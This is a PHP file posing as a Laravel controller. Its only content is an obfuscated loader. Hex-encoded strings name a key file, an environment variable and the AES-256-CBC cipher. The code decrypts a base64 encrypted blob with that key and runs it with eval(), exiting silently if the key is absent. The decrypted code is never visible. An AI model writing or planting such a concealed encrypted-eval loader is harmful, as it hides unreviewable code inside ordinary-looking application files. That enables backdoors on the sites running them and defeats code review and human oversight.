<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('+iFxxPPUWV+4rKdiyP9JFQ==');

$c=base64_decode(

'BS2LVfNzwIYC/OjfV2nACgzlWH+DV/6aPK+ov2jqH9LlWyt3c9Rfy/mu4M0iJ4jPnQVUskqF+cWa' .
'IcBOYdAA+Gamnh4DwgunB5x8bAEgY4lWr849CVtJ379YOwIY3mgHDMoQa58D+ug43vJ9/WhFEFwu' .
'QLtGH/r0FS7eaoMLRkX3i+aC3tqzMJLXn/0JdTkaBXEZPerF44kXXneDDCm4z1aIHWXOEogx1VEQ' .
'mKghtyG6T7icTvFb4xxEq4x46Qw1JSPun6ZxrSEDKfBlKgCe/Jd0lcGa2PdKyI+pO5IedX+zXbGX' .
'/RDhvUIkncnPZA8hz05EQS11EA+O6WYa+C73DOqXFjLp2+8nmg7eJSqMMgqoISXdPP4EcFKRtHwL' .
'hIbrY9BhKOdvKYFx32WQTbUlng=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

